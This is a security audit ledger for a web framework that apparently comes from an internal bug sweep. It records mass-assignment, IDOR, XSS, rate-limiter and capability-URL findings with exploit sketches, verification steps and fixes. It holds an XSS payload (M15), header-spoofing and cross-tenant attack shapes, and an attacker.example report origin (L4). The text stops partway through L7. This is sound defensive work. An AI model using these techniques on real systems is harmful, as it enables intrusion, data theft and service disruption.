# Bug Ledger (`bugz-4`)

**Date:** 2026-06-26
**Scope:** Fourth adversarial sweep beyond `plans/bugz.md`, `plans/bugz-2.md`, `plans/bugz-3.md`, at
`main` (audit launched at HEAD `27abdc630`; main advanced during the run to `f3673778d`).
**Method:** `find-bugz` skill — two multi-agent rounds (61 agents total; find → independent
skeptic-verify → completeness-critic). Round 1: ten static-leaning dimensions. Round 2: seven runtime/auth
gaps the round-1 critic flagged (capability-URL, rate-limiter, guard-chain, framework-secret provisioning,
confidential-at-rest, drizzle runtime invalidation/CAS, client mutation-queue). Every confirmed item was
reproduced in a throwaway `git worktree` off HEAD (recipe at the end), then the worktree was removed.
**No production code was changed.** Each item is **distinct** from every prior-ledger item (including
their Refuted sections). Note: since bugz-3 the agent-tool, opaque-session, and better-auth opaque/jwt
primitives were **reverted/removed** on main; findings here only cite code present at HEAD.

## Severity summary

| Severity | Count | Items  |
| -------- | ----: | ------ |
| High     |     3 | H1-H3  |
| Medium   |    15 | M1-M15 |
| Low      |    14 | L1-L14 |

Recurring themes: **(a) Drizzle read/write provenance gates** keep having uncovered shapes — a write
(H1), a read (H2), and several completeness-residuals of the landed bugz-3 fixes (M5, M6, M13, L6);
**(b) two whole new subsystems** surfaced real bugs — the **rate-limiter / load-shed** (M10, M11, M12)
and the **capability-URL download primitive** (M9, L11, L12, L13); **(c) bugz-3-fix regressions/residuals**
(M2 re-opens M3, M5↦M4, M7↦M6, M13↦M9, L6↦H1/L11, L10↦bugz-3 L10). H1+H2 are the drizzle gate family;
M9–M13 cluster in the rate-limit/capability runtime surface.

---

## HIGH

- [ ] **H1 — KV438 mass-assignment gate ignores computed (non-literal) property keys; attacker-chosen-column writes compile clean.** `packages/drizzle/src/static/derivation.ts:1177-1178`, `packages/drizzle/src/static/schema.ts:757-772`
  - `massAssignmentFactsForObject` derives each payload column via `propertyNameText(property.getNameNode())` **without** `resolveStaticComputed`, so a computed key whose bracket expression is anything but a string/numeric literal returns `undefined` and the property is `continue`d **before** any value verdict — fail-OPEN (the sibling spread path is deliberately fail-CLOSED).
  - **Exploit:** in a governed-table write, `db.update(accounts).set({ [input.field]: input.value })` lets a request choose **both** column and value (set `role`/`ownerId`/`balance` → privilege escalation / cross-tenant write) with zero KV438; the common `const col='role'; set({ [col]: input.role })` (type-checks fine) and a whitelisted-field PATCH helper are equally unanalyzed. Also bypasses the password and confidential-at-rest gates on the same loop.
  - **Verified:** worktree vitest via real `extractMassAssignmentFromProject` (5/5): literal `set({ role })` and `set({ ['role'] })` → 1 fact each; `set({ ['ro'+'le'] })`, `set({ [col] })`, `set({ [input.field]: input.value })` → **0 facts**.
  - **Distinct:** bugz H3/H5 are VALUE-side name laundering on a _resolved_ key; this skips the column-key lookup entirely (computed-member control-flow), a different function and root cause.
  - **Fix:** call `propertyNameText` with `resolveStaticComputed`, and when a key cannot be resolved fail **closed** (emit a fact / reject) like the spread path — never `continue`.

- [ ] **H2 — RQB `with` relation tables are dropped from the query read set, so an owner-scoped related table read bypasses the KV414 IDOR gate (cross-tenant read).** `packages/drizzle/src/static/summaries.ts:805-826,214-238`; consumed at `packages/drizzle/src/static.ts:366-461`
  - `relationalQueryTableExpression` resolves only the **root** `db.query.<t>.findMany/findFirst` table and never walks the `with:` object, so related tables are absent from `fact.reads`; `scopeAuditsFromQueryFacts` only audits owner domains that appear in `reads`, so an owner table reached via `with` is never audited → no KV414. SPEC §10.6 promises "the JOIN is the declaration"; RQB makes the forgotten dependency representable and silent.
  - **Exploit:** `query('feed', { load: (_i, db) => db.query.posts.findMany({ with: { comments: {...} } }) })` where `comments` is `kovo({ owner:'authorId' })` compiles clean (scopeAudits=[]); `/_q/feed` returns every author's owner-scoped comments to any viewer. The byte-identical `leftJoin` form is correctly flagged KV414.
  - **Verified:** worktree (3/3) via `extractQueryFactsFromProject`/`extractOwnerAuditFromProject`: `with` form → `reads=['post']`, scopeAudits=[], diagnostics=[]; `leftJoin` control → `reads=['comment','post']`, KV414 `scope:'unknown'`.
  - **Distinct:** not bugz H3/H5 (owner table present, operand laundered) or bugz-3 H1 (aliased callee erases all facts — here the query is fully recognized, only the relation read is dropped) or bugz-3 M4 (the _shape_ extractor, KV435; this is the _read-set_ extractor, KV414).
  - **Fix:** walk the `with:` object in `relationalQueryTableExpression` and fold related tables into `tableExpressions`/reads (also restores KV407 invalidation for them).

- [ ] **H3 — `compareAndSet` misreads the PGlite driver's affected-row count, so every successful KV429 CAS reports a stale-version conflict on the default driver.** `packages/drizzle/src/cas.ts:86`
  - `const affected = result.rowCount ?? result.rowsAffected ?? result.changes ?? 0` — drizzle-orm's PGlite session returns `{ rows, fields, affectedRows }` (named `affectedRows`), none of which the chain reads, so `affected===0` even when the UPDATE matched and committed → `CasConflict`.
  - **Exploit:** the documented, KV429-compiler-mandated compare-and-set pattern reports
    `cas.ok === false` on the default PGlite driver even though the UPDATE committed, so the handler 409s
    after decrementing stock. Versioned/atomic writes are unusable: fail-safe rejection, not corruption.
    `compareAndSet` is a shipped public API and KV429 is a build-blocking gate that steers authors to it.
  - **Verified:** worktree (real `@electric-sql/pglite` 0.5.1 + drizzle-orm/pglite): a matching versioned UPDATE returns `{ok:false,conflict:true}` while the row was actually updated.
  - **Distinct:** no prior item touches `cas.ts`; bugz-3 M9 (invalidation) and the optimistic items are unrelated.
  - **Fix:** include `affectedRows` (and other driver count fields) in the coalescing chain, or read the count via a driver-agnostic path.

---

## MEDIUM

- [x] **M1 — `respond.file`/`respond.stream` with a string body + `text/html` content-type is wrongly wrapped in the full document shell (download corrupted, loader/CSP injected).** `packages/server/src/document-core.ts:323-326`, `packages/server/src/response.ts:362-380,530-555`
  - `renderRouteDocumentResponse` decides "page render vs respond() outcome" purely by `status===200 && typeof body==='string' && content-type includes 'text/html'`; the `RouteResponseOutcome.routeResponse` marker + Content-Disposition are stripped by `routeOutcomeResponse` and never consulted, so an HTML file/stream outcome falls into document assembly.
  - **Exploit:** `respond.file('<h1>…</h1>', {contentType:'text/html', filename:'report.html'})` ships `<!doctype html>…<script>(inline loader)</script>…` with a CSP attached and the attachment disposition preserved — corrupted download / doubly-nested inline doc. No XSS (attachment downloads; inline-without-verifiedSafe is refused), so output corruption of a public API, not a breach.
  - **Verified:** worktree (2/2) — real `respond.file(text/html)` → body starts `<!doctype html>` and contains `<script`; `text/plain` control returns the bytes untouched.
  - **Distinct:** inverse of bugz-3 M2 (which _lost_ the no-store floor on these outcomes); this _adds_ document wrapping.
  - **Fix:** thread the `routeResponse` marker (or Content-Disposition) into `renderRouteDocumentResponse` and pass non-document outcomes through regardless of content-type.
  - **Evidence:** `pnpm exec vitest --run packages/server/src/response.test.ts` passed after
    integration; `respond.file(text/html)` route outcomes now bypass document wrapping.

- [x] **M2 — Deferred-stream boundary-collision detection scans raw HTML source while the client matches tag-stripped `textContent`; adjacent attacker fields re-open the bugz-3 M3 hazard.** `packages/server/src/deferred-stream.ts:144-156,174-182` vs client at `:94,:192`
  - The bugz-3 M3 fix re-rolls the boundary by testing `line.includes('--<boundary>')` over raw serialized HTML/shell lines, but the emitted client cleanup/apply scripts test `node.textContent.includes('--<boundary>')` — and `textContent` strips tags and concatenates adjacent element text. A marker split across element boundaries (or formed by two adjacent escaped fields) evades the server re-roll. (Found independently by the mutation-stream and compiler-lowering dimensions.)
  - **Exploit:** default boundary `kovo-boundary`; an attacker plants two adjacent escaped fields (`{comments.map(c => <li>{c.text}</li>)}`), first ending `…x--kovo-`, next starting `boundary…`. Server misses it; the client cleanup removes a top-level body child (page-destroying DoS) and the apply walk breaks early dropping a co-located `<kovo-query>`/fragment.
  - **Verified:** worktree (3/3) — `<span>x--kovo-</span><span>boundaryy</span>` keeps the default boundary server-side, while the emitted client scripts' `textContent` match fires.
  - **Distinct:** bugz-3 M3 was exact-line-vs-substring; this is the residual raw-HTML-vs-`textContent` (tag-stripping) axis its fix didn't model.
  - **Fix:** model the client's check — strip tags / scan concatenated text (or escape the marker out of attacker-reachable text), and include the shell, before deciding to re-roll.
  - **Evidence:** `pnpm exec vitest run packages/server/src/deferred-stream.test.ts --run` passed
    after integration; boundary selection now scans tag-stripped textContent-like content before rerolling.

- [x] **M3 — KV426 `trustedHtml` provenance gate misses object destructuring and ternary taint paths (stored/reflected XSS via the escape hatch).** `packages/compiler/src/validate/trusted-html-provenance.ts:132-145,187-221`
  - `classifyExpression` handles only PropertyAccess/ElementAccess/Identifier; a `ConditionalExpression` falls to `return null` (clean), and `classifyIdentifier`→`localConstInitializer` only follows aliases when `ts.isIdentifier(declaration.name)`, so an object-binding-pattern (`const { body } = post`) is invisible.
  - **Exploit:** `render: ({ post }) => { const { body } = post; return <article>{trustedHtml(body)}</article> }` (stored XSS from query data) and the request-input destructure form compile clean, while the dotted-alias equivalent is flagged. Gated on the author using `trustedHtml` on destructured tainted data.
  - **Verified:** worktree via `compileComponentModule` filtered to KV426: dotted control flagged; destructure + ternary forms → no KV426.
  - **Distinct:** static-analysis control-flow blind spot in the provenance gate, not bugz H6 (runtime brand forgery) or the JSX attribute-name XSS items.
  - **Fix:** resolve object/array binding patterns and nested render-param destructuring; classify both ternary arms.
  - **Evidence:** `pnpm exec vitest run packages/compiler/src/trusted-html-provenance.test.ts --run`
    passed after integration; the gate now flags object-destructured query/request aliases and tainted ternary arms.

- [x] **M4 — The `delta` boolean-attribute regex false-positives on an interior `delta` token in a query key, dropping/looping fresh query truth.** `packages/browser/src/wire-parser.ts:160-163` (+ inline loader `:740`)
  - `hasBooleanAttribute(attrs,'delta')` scans the whole raw attrs string with `(?:^|\s)delta(?:\s|=|$|/|>)`, unaware of attribute-value quoting, so `key="river delta map"` sets `delta=true`.
  - **Exploit:** a keyed query whose instance key derives from user input (search-results keyed by the phrase) makes the client misread a full-value chunk as a `QueryDelta` → the value is applied as an empty delta (stale/unchanged), silently dropping fresh server truth.
  - **Verified:** worktree — `readQueryElementChunk({attrs:' name="search" key="river delta map"'}).delta === true` (control `key="river map"` → undefined).
  - **Distinct:** new wire-deserialization misclassification; unrelated to the deferred-stream framing items.
  - **Fix:** parse attributes structurally (or match `delta` only outside quoted values).
  - **Evidence:** `pnpm exec vitest run packages/browser/src/wire-parser.test.ts
packages/browser/src/inline-loader-enhanced-submit.test.ts --run` passed after integration, and
    `pnpm --filter @kovojs/browser run check:inline-loader` proved generated inline-loader parity.

- [ ] **M5 — bugz-3 M4 residual: a secret column raw-projected via a `with`-relation `extras` escapes the KV435 backstop when the related secret table isn't in `reads`.** `packages/drizzle/src/static/query-shapes.ts:159-200,461-477`
  - The M4 fix over-approximates RQB `extras` to opaque paths so KV435 can fire, but `secretProjectionBackstopDiagnostics` only treats a path as secret-leaking when the secret table is in `tableExpressions` (root only, per H2) or the author's declared `reads:`. A secret reached through a `with` relation is in neither unless manually listed.
  - **Exploit:** a posts query that projects an author relation extra from `users.passwordHash` while declaring
    only `reads:[posts]` never fires KV435, so the password hash reaches `/_q`.
  - **Verified:** worktree — `reads:[posts,users]` control fires KV435 ('author.leaked'); `reads:[posts]` leak form → no KV435.
  - **Distinct:** bugz-3 M4 fixed the case where the secret table is the queried/declared table; this is the related-table residual (shares the H2 read-set root cause on the secret-backstop side).
  - **Fix:** same as H2 — fold `with`-relation tables into the read set so the backstop sees the related secret table.

- [ ] **M6 — Owner-principal IDOR gate (KV414) bypassed by binding `input.session.<ownerCol>` to a const — the bugz H5 carrier-root anchor is missing on the const-tracing recovery path.** `packages/drizzle/src/static/summaries.ts:1495-1530`
  - `directPrivateScopeForExpression` anchors `.session/.guard/.tenant` to a proven request carrier root (the bugz H3/H5 fix), but the later recovery fallback `localBoundNonNullableSessionScope`→`directNonNullableSessionScopePath` matches a `session` _segment_ anywhere in the const's initializer access path with **no** carrier-root check.
  - **Exploit:** `async load(input: { session: { userId: string } }, db) { const uid = input.session.userId; return db.delete(orders).where(eq(orders.userId, uid)) }` on an owner table → no KV414; attacker sets any victim's id. The codebase's own H5 comment says this exact shape must be rejected.
  - **Verified:** worktree via `extractOwnerAuditFromProject` — const-bound `input.session.userId` write resolves to `scope:'session'` (no KV414); direct `input.session.userId` (post-H5) is correctly `args`.
  - **Distinct:** new instance of the H3/H5 invariant on a _different_ function (the const-tracing recovery fallback), not the direct member path H5 fixed.
  - **Fix:** apply the `isPrivateScopeCarrierRoot` anchor in `directNonNullableSessionScopePath` too.

- [x] **M7 — Better-Auth secret classification (bugz-3 M6) omits plugin credential tables (twoFactor secret/backupCodes, oauthApplication clientSecret, oauthAccessToken access/refresh tokens).** `packages/better-auth/src/internal/contracts.ts:506-551`, emitter `packages/better-auth/src/internal.ts:1497-1523`
  - The M6 fix added `secret:` only to the core `account`/`session` tables. The blessed bridge classifies `twoFactor`/`oauthAccessToken`/`oauthApplication`/`oauthConsent` as non-exempt owner-scoped `auth` tables with **no** `secret:` entry, so KV435 never brands their credential columns.
  - **Exploit:** an app enabling the standard two-factor / oidc-provider plugin + Kovo's schema generator, with a "2FA status" or token-list query projecting `twoFactor.secret`/`backupCodes` or `oauthAccessToken.accessToken`, ships those credentials to the wire on a green check.
  - **Verified:** worktree — `betterAuthSchemaBridge.account.secret` defined but `'secret' in twoFactor/oauthApplication/oauthAccessToken` all false.
  - **Distinct:** new instance of the M6 classification on the plugin credential tables specifically.
  - **Fix:** add `secret:` lists for the plugin credential/token columns in the bridge + emitter (or mark those tables exempt).
  - **Evidence:** `betterAuthSchemaBridge` and generated schema annotations now mark two-factor, OAuth
    application, and OAuth token credential columns as secret; `pnpm exec vitest run
packages/better-auth/src/index.schema-bridge.test.ts packages/better-auth/src/index.schema-materialize.test.ts
--run` passed 44 tests after integration.

- [x] **M8 — Live-target descriptor attestation falls back to a per-process random secret when no app CSRF is configured, so a minted attestation can't verify across processes (post-mutation live updates silently drop).** `packages/server/src/mutation-wire.ts:490-506,522`
  - When `options.csrf===undefined`, `createLiveTargetAttestation` HMACs with a module-scope `liveTargetAttestationSecret = randomBytes(32)` (per-process, per-import) instead of the deployment-stable secret. SSR mints on one request; a later mutation verifies on another — in multi-process/serverless deploys the secrets differ → `secureEqual` fails → the valid descriptor is filtered out (stale UI). Fails safe (never accepts a forgery).
  - **Exploit:** reachable from the flagship commerce example (no app-level `csrf`, per-mutation csrf, descriptor-gated orderHistory). Correctness/availability of an advertised §9.3 feature in the production-normal multi-process case.
  - **Verified:** worktree — two cache-busted module evaluations (≈ two processes) produce different attestations for the same descriptor in the no-csrf branch; identical in the csrf branch.
  - **Distinct:** no prior item concerns live-target attestation (bugz-3 M5/M6 better-auth machinery was reverted).
  - **Fix:** derive the no-csrf attestation secret from the deployment-stable framework secret (as the csrf branch does), or require a stable secret for live targets.
  - **Evidence:** `pnpm exec vitest run packages/server/src/mutation-wire.test.ts --run` passed
    after integration; no-CSRF live-target attestations now use a stable configured secret and fail closed in production without one.

- [x] **M9 — One-time capability replay store's eviction horizon (20 min, wall clock) is decoupled from the token `expiresIn`, so a `oneTime` token with TTL>20 min replays after its record evicts.** `packages/server/src/capability-url.ts:92-114,295-303`
  - `createMemoryCapabilityReplayStore` (the only shipped store) pins each consumed id's eviction to `Date.now()+DEFAULT_CAPABILITY_TTL_MS*4` (20 min), independent of the token's expiry and of `verifyCapability`'s injectable `now`. For `expiresIn>20min` there is a window where the token is still valid but the replay record is gone → `consume()` returns true again.
  - **Exploit:** `ctx.signUrl({ key:'receipts/ord_1.pdf', oneTime:true, expiresIn:1_800_000 })` + the shipped store: the captured single-use URL is burned at minute 0, then replays at minute 21. Gated behind opting into `createStorageDownloadEndpoint` + the memory replay store + TTL>20 min.
  - **Verified:** worktree (2/2, Date.now() spied) — consume at t0 (burned), evict window, consume again past 20 min but before expiry → succeeds.
  - **Distinct:** the mutation/webhook idem store is a different primitive/key shape; this is the capability replay store.
  - **Fix:** key eviction to the token's own expiry (`exp + skew`), not a fixed multiple of the default TTL.
  - **Evidence:** `CapabilityReplayStore.consume(id, expiresAt)` now records replay IDs until the signed token
    expiry; `pnpm exec vitest run packages/server/src/capability-url.test.ts packages/server/src/capability-route.test.ts
packages/server/src/keyring.test.ts packages/server/src/env.test.ts --run` passed 64 tests after integration.

- [x] **M10 — The coarse per-IP limiter and `guards.rateLimit({per:'ip'})` trust the LEFTMOST `X-Forwarded-For` under `trustedProxy`, enabling per-IP bypass and targeted victim lockout.** `packages/server/src/app-load-shed.ts:417-434`
  - `requestClientIp` takes `x-forwarded-for.split(',')[0]` (and the first `Forwarded for=` element). A trusted proxy/CDN **appends** the real peer at the RIGHT, so the leftmost value is attacker-controlled (CWE-348). There is no trusted-hop count — it is always leftmost.
  - **Exploit:** behind a CDN (`trustedProxy:true`): rotate a fresh fake leftmost → every request gets a new bucket (limit bypass); or send the victim's IP → exhaust the victim's bucket (targeted DoS / lockout). Feeds both the pre-dispatch limiter and the mutation `per:'ip'` guard.
  - **Verified:** worktree (5/5) — `resolveRequestClientIp(app, XFF='1.2.3.4, 9.9.9.9')` returns the spoofed `1.2.3.4`; 50 rotating-leftmost requests → 0 shed under `perIp{max:3}`.
  - **Distinct:** no prior item touches the load-shed client-IP derivation (bugz H2 was the runtime egress address[0]; bugz-3 L7/bugz-4 L8 are the CI egress hook).
  - **Fix:** derive the client IP from the RIGHT with a configurable trusted-hop count (or use the platform peer address); never the raw leftmost.
  - **Evidence:** `pnpm exec vitest --run packages/server/src/app.test.ts
packages/server/src/guards-rate-limit-ip.test.ts` passed after integration; trusted proxy IP
    extraction now uses the rightmost forwarded client value.

- [x] **M11 — The shared rate-limit store + per-check eviction params collapse other surfaces' window and maxKeys to the minimum (under-limits, not fail-safe).** `packages/server/src/app-load-shed.ts:217-277`
  - `consumeRateLimit`→`evictExpiredRateBuckets` iterates **every** bucket in the store using the _currently-executing_ check's `windowMs`/`maxKeys`. The all/mutation/query checks share `state.global` and `state.perIp`, so a short-window or small-maxKeys check purges the longer-window / larger-capacity buckets of other surfaces.
  - **Exploit:** a plausible config (per-second query burst + per-minute global per-IP) — the 60s query budget is reset every ~1s by the all-check's 1s eviction, collapsing it to ~5 req/s instead of 5/min (under-limiting up to ~60×).
  - **Verified:** worktree (fake timers) — the 60s `queries.perIp{max:5}` budget is reset every ~1s by a 1s `perIp` window on the shared store.
  - **Distinct:** new; H1 above is client-IP trust, this is the eviction-params sharing.
  - **Fix:** namespace buckets per check (separate stores) or scope eviction to the bucket's own check params.
  - **Evidence:** `pnpm exec vitest --run packages/server/src/app.test.ts` passed after integration;
    rate-limit buckets are now separated per check so eviction uses the check's own window/maxKeys.

- [x] **M12 — `guards.rateLimit({per:'ip'})` throws on every request for queries and route pages (guaranteed 500) because only the mutation path threads `req.clientIp`.** `packages/server/src/guards.ts:792-809,498-507`
  - `req.clientIp` is attached only when a runner passes a `clientIp` resolver into `resolveLifecycleRequest`; only `app-mutation-request.ts` does so. The query channel and route-page render never thread it, so `per:'ip'` (advertised by the JSDoc for routes/queries/mutations) throws "cannot determine client IP" before the access decision.
  - **Exploit:** attaching the documented `guards.rateLimit({per:'ip'})` to a `query()` or `route()` page → 100% outage of that surface (framework 500). Fails closed; developer-reachable via an advertised config, not attacker-reachable.
  - **Verified:** worktree (3/3) — `runQuery` / route-page with `guards.rateLimit({per:'ip'})` rejects "cannot determine client IP"; the same guard on a mutation works.
  - **Distinct:** bugz M3 was the _design_ throw for anonymous clients; this is the per:'ip' guard being non-functional outside mutations.
  - **Fix:** thread a `clientIp` resolver into the query and route-page lifecycle requests too.
  - **Evidence:** `pnpm exec vitest --run packages/server/src/route-query-guards.test.ts
packages/server/src/guards-rate-limit-ip.test.ts` passed after integration; route/query guards now receive framework-resolved client IPs.

- [x] **M13 — bugz-3 M9 residual: a `crossTable` change still carries child-space keys, and the render/delta path narrows by them and drops the changed parent rows → stale at the render stage.** `packages/server/src/mutation/targets.ts:85-178`, `packages/core/src/query-delta.ts:104-150`
  - M9 over-invalidates only at _target selection_ (`crossTable`→whole). But `mutationRegistryChangeRecords` still attaches resolved child-space `keys` to the crossTable change; `renderQueryChunks`→`buildAffectedKeysByDomain` includes those keys with no crossTable guard, and `renderQueryRerunChunk` ships a §9.1.1 delta keyed by them, so the changed parent rows (different key space) aren't in the delta → stale.
  - **Exploit:** relational `cart` domain (carts+cart_items); `removeCartItem` (writes cart_items) → crossTable change with `keys=[itemId]`; `cartList` (keyed by cart id) is selected whole but the shipped delta narrows by `itemId` and drops the cart rows → stale list. Gated on a delta-eligible relational-domain query.
  - **Verified:** worktree — real `mutationRegistryChangeRecords`+`renderQueryChunks`: crossTable change retains `keys`, the rerun chunk delta-narrows by child keys.
  - **Distinct:** M9 fixed target selection; this is the render/delta stage still narrowing (a different stage of the same fix).
  - **Fix:** drop/ignore `keys` on a `crossTable` change at the render/delta stage (force a full rerun, not a keyed delta).
  - **Evidence:** `pnpm exec vitest run packages/server/src/mutation-delta.test.ts
packages/core/src/query-delta.test.ts --run` passed after integration; cross-table child-space keys no
    longer drive keyed query deltas.

- [x] **M14 — Static-export stale-document prune deletes declared static assets named `index.html` (silent shipped-output loss).** `packages/server/src/static-export-output.ts:163-212`
  - `pruneStaleStaticExportRouteDocuments` builds its owned set from `plan.writes.filter(w => w.itemKind === 'route-document')` only, then `rm()`s every `index.html` under the output root (except `/c/`) not in that set. A declared static-asset write whose basename is `index.html` is excluded → deleted right after being written.
  - **Exploit:** the public API `exportStaticApp(app, { assets: [{ path: '/legacy/index.html', source }] })` copies the page then the prune deletes it → the export silently omits the declared asset. Author-reachable, not attacker.
  - **Verified:** worktree — declared `/legacy/index.html` + `/legacy/page.html`; after `writeStaticExportOutput` the `index.html` asset is gone.
  - **Distinct:** not the `_headers` sidecar items (bugz M4 / bugz-3 L8); this is the prune deleting a declared asset.
  - **Fix:** include static-asset (and client-module) writes in the owned set before pruning.
  - **Evidence:** `pnpm exec vitest run packages/server/src/static-export-output.test.ts --run`
    passed after integration; declared static-asset `index.html` writes are retained during stale-route pruning.

- [x] **M15 — `@kovojs/ui` Table structural parts (`Table`/`TableHead`/`TableBody`/`TableRow`) emit children RAW, bypassing the JSX runtime escaper (XSS).** `packages/ui/src/table.tsx:181,271`
  - `table.tsx` is the only `@kovojs/ui` component that hand-builds HTML and returns objects branded `Symbol.for('kovo.renderedHtml')` (trusted, shipped verbatim). `tablePart()` and `Table.render` interpolate `${children ?? ''}` with no escaping, and hand-built children never pass through the server JSX child escaper. Leaf cells (`TableCell`) correctly escape.
  - **Exploit:** dynamic non-reactive text placed directly under a structural part — `<Table><TableBody>{buildSummary(req.query.q)}</TableBody></Table>` — where the value is a bare local (so `shouldEscapeStaticTextExpression` is false → no compiler escapeText, and the runtime never escapes structural children) renders `<img src=x onerror=…>` live. Narrow (text must sit directly under a structural part, not a cell) but a real XSS.
  - **Verified:** worktree — `TableRow.render({children:'<img src=x onerror=alert(1)>'})` output contains the raw payload (no `&lt;`); `TableCell` escapes.
  - **Distinct:** no Table finding in prior ledgers; distinct from bugz-3 M7 (which _removed_ double-escaping in other primitives and is correct).
  - **Fix:** escape interpolated children in `tablePart`/`Table.render` (or route them through the runtime escaper); reserve the `renderedHtml` brand for genuinely framework-produced markup.
  - **Evidence:** `pnpm exec vitest run packages/ui/src/table.stylex.test.tsx
packages/ui/src/xss-escaping.test.tsx --run` passed after integration; structural parts escape
    unbranded children while preserving branded table composition.

---

## LOW

- [x] **L1 — Cookie-floor `unsafeCookie()` waiver is not bound to the attributes it weakens: one content-free waiver blanket-authorizes Secure+HttpOnly+SameSite downgrades and records an inaccurate audit fact.** `packages/server/src/cookies.ts:95-100,219-232`
  - `applyCookieFloor` gates KV432 on `hasDowngrade && options.unsafe !== undefined` and records `options.unsafe.downgrade` verbatim, never cross-checking it against the actually-weakened attributes; `unsafeCookie()` only requires a non-empty `justification`. So `{downgrade:{}, justification:'…'}` waives _all_ downgrades and the drained fact misstates what was weakened. Reachable only via deliberate use of the public escape on a credential cookie; the by-construction floor still holds without the escape.
  - **Verified:** worktree — `session` cookie with `secure:false, httpOnly:false, sameSite:'none', unsafe:{downgrade:{}}` ships insecure in prod with no throw.
  - **Distinct:** bugz-3 M1 was a _silent_ (no-audit) bypass; here KV432 arms and a fact is produced, but the waiver is coarse and the fact inaccurate.
  - **Fix:** require `unsafe.downgrade` to enumerate (and match) each weakened attribute; reject a waiver that doesn't cover the actual downgrade.
  - **Evidence:** `pnpm exec vitest --run packages/server/src/cookies.test.ts` passed after
    integration; unsafe cookie waivers now must enumerate the exact weakened attributes.

- [x] **L2 — `SecretValue.equals`/`RedactedValue.equals` (advertised constant-time) leak operand length via variable loop count and silently return false for byte-equal non-string operands.** `packages/core/src/secret.ts:105-112,296-303`
  - `timingSafeStringEqual` loops `Math.max(a.length,b.length)` iterations (equality is correct, but total time scales with the secret length); `KovoPoisonBox.equals` falls back to `Object.is` for non-strings, so byte-identical `Uint8Array`/`Buffer` tokens compare unequal by reference.
  - **Verified:** worktree — `equals` runtime scales with secret length; identical `Uint8Array` tokens → false.
  - **Distinct:** no prior item touches `secret.ts`; unrelated to bugz M3 (argon2 cost).
  - **Fix:** compare via a fixed-width digest (HMAC both sides then constant-time compare); handle byte-array operands.
  - **Evidence:** `pnpm exec vitest run packages/core/src/secret.test.ts --run` passed after integration;
    byte-like operands now compare by value through a fixed-width digest before equality.

- [x] **L3 — Guard-failure 403 forbidden HTML responses miss the entire §6.6 document security baseline and the per-principal cache floor.** `packages/server/src/guards.ts:552-556`, `packages/server/src/app-document.ts:114-120`
  - `renderHttpGuardFailureResponse` returns a bare `{body, headers:{Content-Type:text/html}, status:403}`; only 404/500 are routed through `renderErrorDocument`, and the status≠200 pass-through skips `stampPerPrincipalRouteOutcomeFloor`. So a 403 ships with no CSP / X-Frame-Options / COOP / Permissions-Policy / nosniff, and (for per-principal forbidden bodies) no no-store/Vary:Cookie.
  - **Verified:** worktree — real 403 outcome → only Content-Type; no CSP/XFO/Cache-Control.
  - **Distinct:** bugz-3 L2/M2 were unguarded-authed docs / file-stream no-store; this is the 403 guard-failure path missing both baselines.
  - **Fix:** route 403 through `renderErrorDocument` (baseline + reporting) and apply the per-principal floor.
  - **Evidence:** `pnpm exec vitest --run packages/server/src/route-query-guards.test.ts
packages/server/src/access.test.ts examples/reference/src/app.test.ts` passed after integration; 403 guard responses now carry CSP/isolation and private no-store/Vary floors.

- [x] **L4 — The CSP/COOP/Permissions report endpoint is absolutized with the untrusted request Host, enabling report-destination redirection.** `packages/server/src/csp.ts:201-216,383-385`
  - The same-origin report path is converted to absolute via `new URL(request.url).origin`, whose authority comes from the inbound Host header by default; a relative endpoint would always be same-origin. Combined with Host-header cache poisoning of a cacheable framework HTML response (e.g. the 404 doc, which carries reporting headers but no Cache-Control/Vary), the Report-To/Reporting-Endpoints become attacker-controllable.
  - **Verified:** worktree — `renderErrorDocument({status:404, reportingOrigin:'https://attacker.example'})` → Report-To/Reporting-Endpoints contain the attacker origin.
  - **Distinct:** bugz-3 L14 was redactedUrl keeping path secrets at rest; this is the outbound report destination via Host.
  - **Fix:** emit the report endpoint as a relative URL (or validate the origin against a configured allowlist), and ensure error docs carry no-store.
  - **Evidence:** `pnpm exec vitest --run packages/server/src/csp.test.ts
packages/server/src/static-export-manifest.test.ts packages/server/src/static-export-replay.test.ts
packages/server/src/vite-build.test.ts` passed after integration; CSP reporting headers now use relative endpoints.

- [x] **L5 — The replay idempotency fingerprint embeds the per-render-rotating masked CSRF token on the enhanced wire path; `canonicalReplayInput`'s neutralization is dead code.** `packages/server/src/replay.ts:270-297`, `packages/server/src/mutation-wire.ts:333`
  - `replayFingerprint` returns the precomputed `requestFingerprint` verbatim (from `canonicalRequestFingerprint`, no CSRF neutralization) and only calls `canonicalReplayInput` (which rewrites the csrf field) when it is absent. Because the masked token rotates per mint, identical bodies fingerprint differently across renders.
  - **Exploit:** an app using a _stable_ app-chosen `Kovo-Idem` across renders + two renders of the same form submitting the identical body → spurious 409 instead of an idempotent replay. NOT default-reachable (the default client mints a fresh idem per submit). Fails safe.
  - **Verified:** worktree (2/2) — identical body, two masked tokens → divergent fingerprints.
  - **Distinct:** bugz-3 L3 was the FormData→`{}` collapse; this is the dead CSRF-neutralization on the precomputed path.
  - **Fix:** neutralize the csrf field in `canonicalRequestFingerprint` too (or strip it before fingerprinting on the wire path).
  - **Evidence:** `pnpm exec vitest run packages/server/src/replay.test.ts --run` passed after
    integration; replay fingerprints now neutralize rotating CSRF fields even when a precomputed request fingerprint exists.

- [ ] **L6 — bugz-3 H1/L11 residual: `isKovoServerCalleeExpression` still misses const-reassign, renamed local re-export, and re-aliased namespace bindings.** `packages/drizzle/src/static.ts:915-934`
  - The recognizer accepts bare/import-alias/namespace-member callees but not `const q = query`, a local barrel that renamed the re-export (`export { query as q } from '@kovojs/server'`), or `const s = srv; s.query(...)`. Fail-open consumers (derivation.ts, domain-writes.ts) then erase the security gates for that loader.
  - **Verified:** worktree — bare/import-alias/namespace → true; const-reassign / renamed-re-export / re-aliased-namespace → false.
  - **Distinct:** the explicit completeness residual of the bugz-3 H1/L11 alias-hardening.
  - **Fix:** resolve callee bindings by ts-morph symbol identity (follow const initializers + re-export chains) rather than syntactic forms.

- [x] **L7 — The module stream-text renderer import bypasses the dynamic-import URL allowlist enforced by every other dynamic-import sink.** `packages/browser/src/stream-text.ts:173-194`
  - `StreamTextBuffer.render()` imports a `data-stream-renderer` ref via `this.importModule(parsed.url)` with no `assertAllowedKovoDynamicImportUrl` (handlers / query-bindings call it). Its only protection is a pre-wrapped `importModule`, which `installKovoLoader` provides only when `allowedClientModuleUrls` is set.
